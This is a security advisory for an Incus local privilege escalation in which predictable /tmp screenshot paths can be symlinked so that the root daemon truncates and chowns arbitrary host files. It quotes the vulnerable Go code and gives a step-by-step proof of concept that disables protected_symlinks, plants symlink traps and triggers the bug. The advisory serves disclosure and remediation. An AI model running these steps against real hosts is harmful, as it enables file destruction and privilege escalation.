# [M] Incus vulnerable to local privilege escalation through VM screenshot path

## Summary
Severity: Medium
Advisory: GHSA-q9vp-3wcg-8p4x
CVE: CVE-2026-33711
CWE: CWE-61
Ecosystem: Go
CVSS: CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-03-27
Source: https://github.com/advisories/GHSA-q9vp-3wcg-8p4x
Type: github-advisory

## Affected
- Go: `github.com/lxc/incus/v6` — affected >=0 <6.23.0

## Details
### Summary
Incus provides an API to retrieve VM screenshots, that API relies on the use of a temporary file for QEMU to write the screenshot to which is then picked up and sent to the user prior to deletion.

As Incus uses predictable paths under /tmp for this, an attacker with local access to the system can abuse this mechanism by creating their own symlinks ahead of time.

On the vast majority of Linux systems, this will result in a "Permission denied" error when requesting a screenshot. That's because the Linux kernel has a security feature designed to block such attacks, `protected_symlinks`.

On the rare systems with this purposefully disabled, it's then possible to trick Incus intro truncating and altering the mode and permissions of arbitrary files on the filesystem, leading to a potential denial of service or possible local privilege escalation.

### Details
The incusd daemon contains a local privilege escalation (LPE) primitive in the Virtual Machine VGA screenshot handling routine. When a screenshot is requested, the daemon creates a file in the globally writable /tmp directory using a deterministic pathname derived from the instance identifier. Because this implementation uses a predictable pathname in a world-writable directory, it exposes the operation to pathname attacks. The file permissions are then restricted, and the file is passed to the QEMU screenshot routine. In the QEMU path, ownership is transferred to the unprivileged Virtual Machine UID before the QEMU Machine Protocol is invoked with the same pathname.

An attacker able to pre-place or otherwise control that pathname can redirect truncation and ownership changes to an unintended host file.

This allows attacker-chosen host files to be truncated and have ownership reassigned to the unprivileged VM UID. In practice, this can be used to destroy sensitive root-owned files and alter ownership of security-relevant host paths. Depending on the targeted path and follow-up conditions, the impact may include denial of service, corruption of credentials or configuration, persistence through modified startup or service files, and further privilege escalation on the host.

As previously mentioned, this is only possible if the kernel protection mechanism has been previously disabled.
It's possible to check on its status by reading the file at `/proc/sys/fs/protected_symlinks`, a value of 0 is required for this attack to work.

Affected File:
https://github.com/lxc/incus/blob/v6.20.0/cmd/incusd/instance_console.go 

Affected Code:
```go
func instanceConsoleGet(d *Daemon, r *http.Request) response.Response {
    [...]
    } else if inst.Type() == instancetype.VM {
        v, ok := inst.(instance.VM)
        if !ok {
            return response.SmartError(errors.New("Failed to cast inst to VM"))
        }

        var headers map[string]string
        if consoleLogType == "vga" {
            screenshotFile, err := os.Create(fmt.Sprintf("/tmp/incus_screenshot_%d", inst.ID()))
            if err != nil {
                return response.SmartError(fmt.Errorf("Couldn't create screenshot file: %w", err))
            }

            err = screenshotFile.Chmod(0o600)
            if err != nil {
                return response.SmartError(err)
            }

            ent.Cleanup = func() {
                _ = screenshotFile.Close()
                _ = os.Remove(screenshotFile.Name())
            }

            err = v.ConsoleScreenshot(screenshotFile)
            if err != nil {
                return response.SmartError(err)
            }
            [...]
    }
    [...]
}
```

Affected File:
https://github.com/lxc/incus/blob/v6.20.0/internal/server/instance/drivers/driver_qemu.go 

Affected Code:
```go
func (d *qemu) ConsoleScreenshot(screenshotFile *os.File) error {
    if !d.IsRunning() {
        return errors.New("Instance is not running")
    }


    // Check if the agent is running.
    monitor, err := d.qmpConnect()
    if err != nil {
        return err
    }

    err = screenshotFile.Chown(int(d.state.OS.UnprivUID), -1)
    if err != nil {
        return fmt.Errorf("Failed to chown screenshot path: %w", err)
    }


    // Take the screenshot.
    err = monitor.Screendump(screenshotFile.Name())
    if err != nil {
        return fmt.Errorf("Failed taking screenshot: %w", err)
    }

    return nil
}
```

### PoC
The following PoC demonstrates that a local attacker can pre-place symlink traps in the predictable /tmp/incus_screenshot_<ID> namespace and coerce the root incusd daemon into truncating an unintended host file and reassigning its ownership during a VM VGA screenshot request.

Step 0: Disable the kernel symlink protection mechanism

Commands (as root):
```
echo 0 > /proc/sys/fs/protected_symlinks
```

Step 1: Prepare the target VM

From an Incus client with access to the target server, ensure a running virtual machine exists that can service the VGA screenshot path.

Commands:
```
incus init images:alpine/edge lpe-vm --vm --project default
incus config set lpe-vm security.secureboot=false --project default
incus start lpe-vm --project default
```

Step 2: Create a root-owned trap target and pre-place /tmp symlinks

On the Incus host, create a sensitive root-owned file and place symlinks across a range of likely screenshot identifiers so that the predictable daemon pathname resolves to the chosen host target.

Commands:
```
echo "SuperSecretRootHash" > /root/shadow_trap
chmod 600 /root/shadow_trap
ls -l /root/shadow_trap


for i in $(seq 1 100); do
    ln -sf /root/shadow_trap /tmp/incus_screenshot_$i
done

ls -l /tmp/incus_screenshot_* | head
```

Result:
```
-rw------- 1 root root 20 Mar 18 00:27 /root/shadow_trap
```

Step 3: Trigger the vulnerable screenshot path

From an Incus client with access to the target server, request the VM VGA console through the Incus API. This causes the daemon to open the predictable /tmp/incus_screenshot_<ID> path, change its ownership, and pass the same pathname into the QEMU screendump flow.


Command:
```
incus query -X GET "/1.0/instances/lpe-vm/console?project=default&type=vga" > /dev/null
```

Result:
```
Error: Failed taking screenshot: Failed to connect to QEMU monitor
```

Step 4: Verify host-side impact

On the Incus host, inspect the previously root-owned target file and confirm that it has been truncated and that ownership has been reassigned to the unprivileged VM UID.

Command:
```
ls -l /root/shadow_trap && stat /root/shadow_trap
```

Result:
```
-rw------- 1 incus root 0 Mar 18 00:29 /root/shadow_trap
  File: /root/shadow_trap
  Size: 0
  Access: (0600/-rw-------)
  Uid: ( 100000/   incus)
  Gid: (     0/    root)
```

It is recommended to create the temporary file securely in a directory controlled exclusively by the daemon, avoid predictable /tmp paths, and avoid reusing a mutable pathname after file creation.

### Credit
This issue was discovered and reported by the team at 7asecurity (https://7asecurity.com/)

## References
- https://github.com/lxc/incus/security/advisories/GHSA-q9vp-3wcg-8p4x
- https://nvd.nist.gov/vuln/detail/CVE-2026-33711
- https://github.com/lxc/incus/commit/ef006240ac2475ddea7b8406cecc7dbd1a883fdf
- https://github.com/lxc/incus
- https://github.com/lxc/incus/releases/tag/v6.23.0
